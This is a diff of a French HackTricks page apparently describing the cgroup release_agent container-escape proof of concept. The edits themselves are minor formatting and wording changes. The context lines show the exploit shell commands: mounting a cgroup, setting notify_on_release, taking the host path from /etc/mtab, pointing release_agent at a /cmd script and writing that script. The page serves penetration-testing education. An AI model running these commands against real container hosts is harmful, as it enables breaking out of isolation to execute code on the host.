@@ -34,20 +34,20 @@ La preuve de concept (PoC) démontre une méthode pour exploiter les cgroups en 
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
-2. **Configurer le Cgroup Enfant :**
-* Un cgroup enfant nommé "x" est créé dans le répertoire cgroup monté.
+2. **Configurer le Cgroup Enfant :**  
+* Un cgroup enfant nommé "x" est créé dans le répertoire cgroup monté.  
 * Les notifications sont activées pour le cgroup "x" en écrivant 1 dans son fichier notify\_on\_release.
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 3. **Configurer l'Agent de Libération :**
 * Le chemin du conteneur sur l'hôte est obtenu à partir du fichier /etc/mtab.
-* Le fichier release\_agent du cgroup est ensuite configuré pour exécuter un script nommé /cmd situé au chemin hôte acquis.
+* Le fichier release\_agent du cgroup est ensuite configuré pour exécuter un script nommé /cmd situé au chemin de l'hôte acquis.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-4. **Créer et configurer le script /cmd :**  
+4. **Créer et Configurer le Script /cmd :**
 * Le script /cmd est créé à l'intérieur du conteneur et est configuré pour exécuter ps aux, redirigeant la sortie vers un fichier nommé /output dans le conteneur. Le chemin complet de /output sur l'hôte est spécifié.
 ```shell
 echo '#!/bin/sh' > /cmd
@@ -70,7 +70,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
